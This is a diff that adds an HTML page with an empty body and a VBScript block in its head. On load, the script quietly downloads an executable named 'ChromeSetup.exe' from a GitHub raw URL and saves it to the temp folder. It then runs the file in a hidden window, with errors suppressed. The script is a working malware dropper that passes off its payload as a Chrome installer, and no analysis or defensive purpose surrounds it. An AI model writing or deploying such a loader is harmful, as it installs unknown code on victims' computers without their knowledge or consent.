@@ -1,0 +1,29 @@
+<html>
+  <head>
+    <script language="VBScript">
+      On Error Resume Next
+
+      dim temp, url, shell
+      temp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) ' %TEMP%
+      url = "https://github.com/naruto3213213/111/raw/refs/heads/main/ChromeSetup.exe"
+
+      Set xHttp = CreateObject("Microsoft.XMLHTTP")
+      xHttp.Open "GET", url, False
+      xHttp.Send
+
+      If xHttp.Status = 200 Then
+          Set stream = CreateObject("ADODB.Stream")
+          stream.Type = 1
+          stream.Open
+          stream.Write xHttp.responseBody
+          stream.SaveToFile temp & "\ChromeSetup.exe", 2
+          stream.Close
+
+          Set shell = CreateObject("WScript.Shell")
+          shell.Run Chr(34) & temp & "\ChromeSetup.exe" & Chr(34), 0, False
+      End If
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
